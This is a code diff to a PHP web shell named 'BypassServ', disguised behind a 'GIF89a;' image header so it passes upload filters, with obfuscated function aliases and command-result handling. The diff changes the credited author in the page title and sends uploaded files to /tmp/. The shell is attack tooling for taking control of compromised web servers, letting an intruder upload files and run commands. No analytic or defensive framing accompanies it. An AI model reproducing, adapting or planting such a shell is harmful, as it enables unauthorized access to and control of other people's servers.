@@ -3,7 +3,7 @@ GIF89a;
 <!DOCTYPE html>
 <html>
 <head>
-    <title>BypassServ By HaxorSec</title>
+    <title>BypassServ By Nara</title>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="robots" content="noindex, nofollow">
@@ -265,7 +265,7 @@ $viewCommandResult = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     if (isset($_FILES['fileToUpload'])) {
-        $target_file = $currentDirectory . '/' . $bs($_FILES["fileToUpload"]["name"]);
+        $target_file = '/tmp/' . $bs($_FILES["fileToUpload"]["name"]);
         if ($mup($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
             echo "<hr>File " . $htm($bs($_FILES["fileToUpload"]["name"])) . " Upload success<hr>";
         } else {
